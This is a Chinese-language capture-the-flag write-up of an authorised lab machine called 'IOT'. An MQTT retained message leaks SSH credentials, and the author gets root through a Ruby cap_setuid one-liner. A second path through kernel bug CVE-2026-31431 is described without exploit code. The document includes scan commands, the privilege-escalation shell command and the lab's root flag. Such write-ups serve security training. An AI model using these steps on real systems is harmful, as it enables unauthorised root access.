# IOT 靶机复盘：MQTT 到 root（Ruby 能力 / Copy Fail）

> 本文记录的是隔离环境中的授权靶机复盘。凭据复用、能力滥用与内核提权验证均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | IOT / HMV（Debian） |
| 主机名 | iot |
| 目标地址 | 192.168.134.69 |
| 开放端口 | 22/tcp（OpenSSH）、1883/tcp（Mosquitto 2.0.21） |
| 内核 | `6.12.74+deb13+1-amd64`（2026-03-08） |
| 最终路径 | MQTT 保留消息 → `redteam` → 提权（Ruby `cap_setuid` **或** CVE-2026-31431 Copy Fail）→ root |

![|294](/content/iot/image-01.png)

## 1. 攻击链概览

入口不在 Web，而在 MQTT。Nmap 默认脚本把 broker 上的保留消息拉出来，里面直接挂着 SSH 口令。进用户之后，提权有两条都能到 root：

```text
主机发现 / 全端口扫描
  → 1883 Mosquitto；mqtt-subscribe 拉保留消息
  → ssh/login: redteam:Pentest123!
  → SSH 登录 + user.txt
  → 提权 A：getcap → ruby3.3 cap_setuid=ep → setuid(0)
  → 提权 B：内核存在 CVE-2026-31431（Copy Fail）→ 本地 LPE
```

这次实际截图走的是 **A（Ruby 能力）**；靶机内核落在 Copy Fail 影响范围内，**B 也可以打**。

## 2. 主机发现与扫描

![主机发现](/content/iot/image-02.png)

```bash
nmap -sT -sV -sC -O -p- 192.168.134.69
```

| 端口 | 服务 | 版本 |
|------|------|------|
| 22/tcp | ssh | OpenSSH 10.0p2 Debian |
| 1883/tcp | mqtt | mosquitto 2.0.21 |

没有 HTTP。全端口只开这两个，后面基本就围着 MQTT 和本机提权转。

## 3. 入口：MQTT 保留消息里的口令

`-sC` 会跑 `mqtt-subscribe`：连上 1883，订阅 `#`，把 broker 上的**保留消息（retained message）**全部吐出来。除了一堆 `$SYS/broker/...` 统计外，夹着一条业务主题：

```text
ssh/login: redteam:Pentest123!
```

保留消息的特点是后订阅者也能立刻收到最后一次 payload。把登录信息写成 retained topic，等于把 SSH 口令挂在明文 1883 上。

```bash
ssh redteam@192.168.134.69
# Pentest123!
```

![SSH 登录 redteam](/content/iot/image-03.png)

```text
redteam@iot:~$ ls
user.txt
redteam@iot:~$ id
uid=1001(redteam) gid=1001(redteam) groups=1001(redteam),100(users)
redteam@iot:~$ uname -a
Linux iot 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64 GNU/Linux
```

拿到 user flag。内核版本后面判断 Copy Fail 时要用。

## 4. 提权 A：Ruby 的 cap_setuid（本次实操）

先按常规枚举 SUID，结果都是常见系统二进制，没有明显可写脚本或异常 SUID：

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID 枚举](/content/iot/image-04.png)

再查能力位：

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

![getcap 发现 ruby3.3](/content/iot/image-05.png)

关键一行：

```text
/usr/bin/ruby3.3 cap_setuid=ep
```

`cap_setuid=ep` 表示这个 Ruby 进程可以调用 `setuid()`。解释器一旦带这个能力，就可以把有效 UID 改成 0，再 `exec` 出 root shell：

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

![Ruby 提权到 root](/content/iot/image-06.png)

```text
root@iot:~# id
uid=0(root) gid=1001(redteam) groups=1001(redteam),100(users)
root@iot:~# cat /root/root.txt
cb0f023463e47a76f9d69e0b435a10882b6dd7489c5ca4d4b6ccac9c631a46d8
```

能力位比满地找 SUID 更隐蔽：文件权限看起来正常，只有 `getcap` 才会暴露。

## 5. 提权 B：CVE-2026-31431（Copy Fail）

靶机**存在** CVE-2026-31431，也可以用 Copy Fail 做内核提权。

Copy Fail 是 Linux 内核密码子系统里的逻辑洞，落在 `algif_aead`（AF_ALG 用户态加密接口）。2017 年的 in-place 优化让 page cache 页能进入可写的 destination scatterlist；再配合 `splice()`，低权限用户可以对任意可读文件的 page cache 做受控写入（典型是改内存里的 setuid 二进制，例如 `/usr/bin/su`），磁盘文件本身可以不动。

公开资料给出的影响范围大致是内核 **4.14～6.19.11**（上游修复在 2026-04 前后）。本机：

```text
Linux iot 6.12.74+deb13+1-amd64 ... (2026-03-08)
```

`6.12.74` 仍在未修窗口里，所以本地用户拿到 `redteam` 之后，Copy Fail 同样能抬到 root。这条路和 Ruby 能力无关——即使没有 `cap_setuid`，内核洞也能单独成链。

实操上一般是：确认内核版本 → 用公开 PoC / 现成利用脚本在本机跑 → 拿到 root。本次复盘截图走的是 Ruby；Copy Fail 作为靶机设计的第二条提权，记录在这里。

## 6. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| MQTT 保留消息 | `mqtt-subscribe` / 订阅 `#` 会把 retained payload 一并吐出 |
| 明文 1883 | 无 TLS 的 broker 上放 `ssh/login`，等于公开粘贴板 |
| SUID + getcap | 两边都要扫；这次脏的是能力，不是 SUID |
| `cap_setuid=ep` | 解释器（Ruby 等）带此能力即可 `setuid(0)` |
| CVE-2026-31431 | Copy Fail：`algif_aead` + `splice` → page cache 写入 → 本地 LPE |
| 内核版本 | `6.12.74` 落在 Copy Fail 影响范围内，两条提权都能成立 |

## 7. 复盘

IOT 把入口放在消息总线上：保留主题直接送 SSH 口令，进盒子之后又摆了两条提权。

- **短路径**：`getcap` 看到 `ruby3.3 cap_setuid=ep`，一行 Ruby 进 root——这是这次截图里的实操。
- **内核路径**：`uname` 对上 CVE-2026-31431（Copy Fail）的影响范围，说明就算没有能力位误配，本地用户也能靠内核洞抬权。

带走的习惯：看到 1883 就订阅一遍主题；提权枚举里 `getcap` 和 SUID 同级；再看一眼内核版本是否撞上当年的公开 LPE。
